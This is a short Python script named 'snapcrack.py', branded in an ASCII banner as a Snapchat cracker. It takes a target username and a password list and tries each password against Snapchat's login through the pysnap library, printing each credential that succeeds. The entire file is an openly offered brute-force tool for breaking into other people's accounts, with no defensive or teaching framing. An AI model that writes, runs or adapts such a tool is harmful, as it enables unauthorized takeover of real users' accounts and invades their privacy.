#!/usr/bin/env python

from pysnap import *
import sys
import os

try:
    targetusername = sys.argv[1]
except:
    print("Syntax: snapcrack.py username /path/to/passlist.txt")
try:
    targetpasslist = sys.argv[2]
except:
    print("Syntax: snapcrack.py username /path/to/passlist.txt")


os.system("clear")
print("  ██████  ███▄    █  ▄▄▄       ██▓███   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀   ")
print("▒██    ▒  ██ ▀█   █ ▒████▄    ▓██░  ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒   ")
print("░ ▓██▄   ▓██  ▀█ ██▒▒██  ▀█▄  ▓██░ ██▓▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ")
print("  ▒   ██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄   ")
print("▒██████▒▒▒██░   ▓██░ ▓█   ▓██▒▒██▒ ░  ░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ")
print("▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▓▒░ ░  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ")
print("░ ░▒  ░ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░▒ ░       ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ")
print("░  ░  ░     ░   ░ ░   ░   ▒   ░░       ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ")
print("██████████████████████████████████████████████████████████████████████████████████████")
print("█                       SNAPCHAT CRACKER BY A HOT TRANS GIRL                         █")
print("██████████████████████████████████████████████████████████████████████████████████████")

s = Snapchat()

def main():
	print(f"[░]Now attempting to crack: {targetusername}")
	print("Objects created..")

	passwords = open(targetpasslist,"r")

	for targetpassword in passwords:
		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
		can_login = s.login(targetusername, targetpassword)
			
		is_logged = can_login.find(b"logged")
		if is_logged > 0:

		# break
			print("[░]success: username: " + targetusername + "\t password: " + targetpassword)
		# 	# break
		else:
			print(f"[░] {targetpassword} FAIL")


if __name__ == '__main__':
	main()
